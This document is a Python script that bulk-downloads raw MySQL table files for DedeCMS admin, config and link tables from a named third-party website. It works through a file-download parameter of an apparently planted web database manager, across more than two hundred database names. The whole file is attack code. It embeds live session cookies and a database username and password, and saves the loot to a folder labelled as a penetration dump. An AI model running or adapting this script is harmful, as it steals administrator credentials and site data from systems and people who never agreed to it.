#coding:utf-8
from requests_html import HTMLSession
import requests, urllib
import os
import re

session = HTMLSession()

dbnamelist=["a1","a10","a2","a3","a4","a5","a6","a7","a8","a9","a999","k110","k111","k112","k113","k114","k115","k116","k117","k118","k119","k120","k121","k122","k123","k124","k125","k126","k127","k128","k129","k130","k131","k132","k133","k134","k135","k136","k137","k138","k139","k140","k141","k142","k143","k144","k145","k146","k147","k148","k149","k150","k151","k152","k153","k154","k155","k156","k157","k158","k159","k160","k161","k162","k163","k164","k165","k166","k167","k168","k169","k170","k171","k172","k173","k174","k175","k176","k177","k178","k179","k180","k181","k182","k183","k184","k185","k186","k187","k188","k189","k190","k191","k192","k193","k194","k195","k196","k197","k198","k199","k200","k201","k202","k203","k204","k205","k206","k207","k208","k209","k210","k211","k212","k213","k214","k215","k216","k217","k218","k219","k220","k221","k222","k223","k224","k225","k226","k227","k228","k229","k230","k231","k232","k233","k234","k235","k236","k237","k238","k239","k240","k241","k242","k243","k244","k245","k246","k247","k248","k249","k250","k251","k252","k253","k254","k255","k256","k257","k258","k259","k260","k261","k262","k263","k264","k265","k266","k267","k268","k269","k270","k271","k272","k273","k274","k275","k276","k277","k278","k279","k280","k281","k282","k283","k284","k285","k286","k287","k288","k289","k290","k291","k292","k293","k294","k295","k296","k297","k298","k299","k300","k301","k302","k303","k304","k305","k306","k307","k308","k309","k310","k311","k312","k313","k314","k315","k316","k317","k318","k319","k320","k321","k322","k323","k324","k325","k326","k327","k328","k329","k330","k331","k332","k333","k334","k335","k336"]

# http://wanhaika.net/plus/Teams.php?eanver=main&path=D%3A%2FBaiduNetdiskDownload%2F92.22%2Fmysql%2Fmysql%2Fa1

url_h="http://wanhaika.net/plus/Teams.php?down=D%3A%2FBaiduNetdiskDownload%2F92.22%2Fmysql%2Fmysql%2F"
dede_flink_frm = "dede_flink.frm"
dede_flink_MYD = "dede_flink.MYD"
dede_flink_MYI = "dede_flink.MYI"

dede_admin_frm="dede_admin.frm"
dede_admin_MYD="dede_admin.MYD"
dede_admin_MYI="dede_admin.MYI"

dede_sysconfig_frm="dede_sysconfig.frm"
dede_sysconfig_MYD="dede_sysconfig.MYD"
dede_sysconfig_MYI="dede_sysconfig.MYI"

for dbname in dbnamelist:
    print(dbname)
    urllist=[
        ["{}%2F{}".format(dbname,dede_flink_frm),"{}%2F{}".format(dbname,dede_flink_MYD),"{}%2F{}".format(dbname,dede_flink_MYI),
        "{}%2F{}".format(dbname,dede_admin_frm),"{}%2F{}".format(dbname,dede_admin_MYD),"{}%2F{}".format(dbname,dede_admin_MYI),
        "{}%2F{}".format(dbname,dede_sysconfig_frm),"{}%2F{}".format(dbname,dede_sysconfig_MYD),"{}%2F{}".format(dbname,dede_sysconfig_MYI)]
    ]
    headers={
        "cookie":"envlpass=aafe421b8ad20fe391be17a529c844c2; serveru=wanhaika.net%2Fplus%2FTeams.php; serverp=cc11; m_eanverhost=localhost; m_eanverport=3306; m_eanveruser=admin01; m_eanverpass=wanli361361A; UM_distinctid=16c933776c533e-00feeb5c705c04-39395704-1fa400-16c933776c61f6; CNZZDATA1275182123=338178046-1565837981-%7C1565837981; CNZZDATA1277906134=571541134-1565837986-%7C1565837986; PHPSESSID=qmhr21mkvel0ldsebt9uu9arh2; DedeUserID=1; DedeUserID__ckMd5=75678db749c8a6af; DedeLoginTime=1565838662; DedeLoginTime__ckMd5=be09b5d7365e86db"
    }
    # D:\www\备份文件\渗透数据库
    my_file="D:/www/备份文件/渗透数据库/1/{}".format(dbname)
    my_file_name1=my_file+ "/" +dede_flink_frm
    my_file_name2=my_file+ "/" +dede_flink_MYD
    my_file_name3=my_file+ "/" +dede_flink_MYI

    my_file_name4=my_file+ "/" +dede_admin_frm
    my_file_name5=my_file+ "/" +dede_admin_MYD
    my_file_name6=my_file+ "/" +dede_admin_MYI

    my_file_name7=my_file+ "/" +dede_sysconfig_frm
    my_file_name8=my_file+ "/" +dede_sysconfig_MYD
    my_file_name9=my_file+ "/" +dede_sysconfig_MYI

    if not os.path.exists(my_file):
            os.makedirs(my_file)

    for url in urllist:
        response = session.get(url_h+url[0],headers=headers)
        txt = response.content
        with open( my_file_name1,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[1],headers=headers)
        txt = response.content
        with open( my_file_name2,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[2],headers=headers)
        txt = response.content
        with open( my_file_name3,'wb' ) as f:
            f.write(txt)
        response = session.get(url_h+url[3],headers=headers)
        txt = response.content
        with open( my_file_name4,'wb' ) as f:
            f.write(txt)
            
        response = session.get(url_h+url[4],headers=headers)
        txt = response.content
        with open( my_file_name5,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[5],headers=headers)
        txt = response.content
        with open( my_file_name6,'wb' ) as f:
            f.write(txt)
        
        response = session.get(url_h+url[6],headers=headers)
        txt = response.content
        with open( my_file_name7,'wb' ) as f:
            f.write(txt)
            
        response = session.get(url_h+url[7],headers=headers)
        txt = response.content
        with open( my_file_name8,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[8],headers=headers)
        txt = response.content
        with open( my_file_name9,'wb' ) as f:
            f.write(txt)




